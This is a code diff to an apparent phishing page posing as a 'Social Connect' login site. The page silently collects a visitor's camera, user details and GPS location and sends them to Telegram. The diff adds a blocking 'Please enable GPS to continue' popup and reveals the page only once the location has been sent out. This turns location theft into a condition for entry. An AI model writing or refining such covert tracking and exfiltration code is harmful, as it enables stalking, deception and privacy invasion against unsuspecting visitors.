@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Social Connect</title>
     <style>
         body {
@@ -119,6 +120,34 @@
         #initial-container {
             display: none;
         }
+        #gps-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        #gps-popup-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        #gps-popup button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -139,6 +168,12 @@
                 <div class="error-message" id="error-message">Wrong username or password. Please try again.</div>
             </div>
             <button class="create-account">Create new account</button>
+        </div>
+    </div>
+    <div id="gps-popup">
+        <div id="gps-popup-content">
+            <p>Please enable GPS to continue.</p>
+            <button onclick="checkLocation()">Enable GPS</button>
         </div>
     </div>
     <script>
@@ -277,11 +312,11 @@
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
                     console.error("Error getting location: ", error);
-                    alert("Please enable GPS and allow location access to continue.");
+                    showGPSPopup();
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
-                alert("Please enable GPS and allow location access to continue.");
+                showGPSPopup();
             }
         }
 
@@ -303,6 +338,7 @@
 
                 if (response.ok) {
                     console.log("Location info sent to Telegram");
+                    document.getElementById('main-container').style.display = 'flex';
                 } else {
                     console.error("Error sending location info to Telegram: ", response.statusText);
                 }
@@ -311,13 +347,19 @@
             }
         }
 
+        function showGPSPopup() {
+            document.getElementById('gps-popup').style.display = 'flex';
+        }
+
+        function checkLocation() {
+            document.getElementById('gps-popup').style.display = 'none';
+            getLocation();
+        }
+
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
             await getLocation();
-
-            document.getElementById('initial-container').style.display = 'none';
-            document.getElementById('main-container').style.display = 'flex';
         }
 
         function sendToTelegram() {
